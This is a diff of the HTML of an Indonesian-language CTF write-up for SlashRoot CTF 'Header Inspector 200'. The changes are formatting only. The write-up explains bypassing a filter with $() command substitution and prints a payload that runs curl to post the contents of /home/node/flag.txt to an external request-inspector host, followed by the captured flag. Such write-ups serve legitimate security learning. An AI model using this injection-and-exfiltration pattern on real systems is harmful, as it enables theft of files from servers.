@@ -47,14 +47,15 @@ Oke, untungnya $() tidak dibanned.
 Kita akan membypassnya menggunakan command curl yang dibungkus dengan $() dan mengoper responsenya ke HTTP Request Inspector
 http://reqbin.cacadosman.web.id/v0b9bnv0?inspect
 Kita eksekusi dengan memasukkan payload berikut">
-<meta itemprop="datePublished" content="2018-07-31T10:12:31&#43;00:00" />
-<meta itemprop="dateModified" content="2018-07-31T10:12:31&#43;00:00" />
+<meta itemprop="datePublished" content="2018-07-31T10:12:31+00:00" />
+<meta itemprop="dateModified" content="2018-07-31T10:12:31+00:00" />
 <meta itemprop="wordCount" content="82">
 <meta itemprop="image" content="https://cacadosman.com/"/>
 
 
 
-<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary_large_image"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://cacadosman.com/"/>
 
 <meta name="twitter:title" content="Writeup SlashRoot CTF - Header Inspector 200"/>
@@ -157,7 +158,7 @@ Kita eksekusi dengan memasukkan payload berikut"/>
 <p>Kita akan membypassnya menggunakan command curl yang dibungkus dengan $() dan mengoper responsenya  ke HTTP Request Inspector</p>
 <p><a href="http://reqbin.cacadosman.web.id/v0b9bnv0?inspect">http://reqbin.cacadosman.web.id/v0b9bnv0?inspect</a></p>
 <p>Kita eksekusi dengan memasukkan payload berikut</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">$(</span>curl --data <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag=</span><span style="color:#66d9ef">$(</span>cat /home/node/flag.txt<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> http://reqbin.cacadosman.web.id/v0b9bnv0<span style="color:#66d9ef">)</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">$(</span>curl --data <span style="color:#e6db74">&#34;flag=</span><span style="color:#66d9ef">$(</span>cat /home/node/flag.txt<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> http://reqbin.cacadosman.web.id/v0b9bnv0<span style="color:#66d9ef">)</span>
 </code></pre></div><p>BIMSALABIM AVADA KADAVRA</p>
 <p><img src="/wp-content/2018/07/headins2.png" alt=""></p>
 <p><strong>SlashRootCTF{b3c0me_a_cvvvrL_n1nj4!}</strong></p>
